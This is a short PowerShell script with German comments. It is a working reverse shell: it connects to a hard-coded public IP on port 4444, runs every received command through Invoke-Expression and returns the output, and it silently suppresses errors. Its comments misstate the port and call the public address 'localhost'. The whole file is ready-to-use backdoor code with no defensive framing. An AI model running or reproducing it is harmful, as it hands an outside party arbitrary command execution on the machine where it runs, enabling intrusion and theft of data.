#Setup Variablen
$result = $null
$message = $null
# Client-Skript: Verbindet sich zum Server auf Port 8080
$serverAddress = "80.135.62.247"  # localhost für Testzwecke
$port = 4444                   # Der gleiche Port wie im Server-Skript

try {
    $client = New-Object System.Net.Sockets.TcpClient($serverAddress, $port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)
    $writer.AutoFlush = $true

    while($true)
    {
        try
        {
            #Befehl vom Server bekommen
            $message = $reader.ReadLine()

            if($message)
            {
                # Führe den empfangenen Befehl aus und sende das Ergebnis zurück
                $result = Invoke-Expression $message
                $writer.WriteLine("$result")
            }
        }
        catch
        {}

    }
    # Schließe die Verbindung
    $client.Close()

} 
catch 
{}
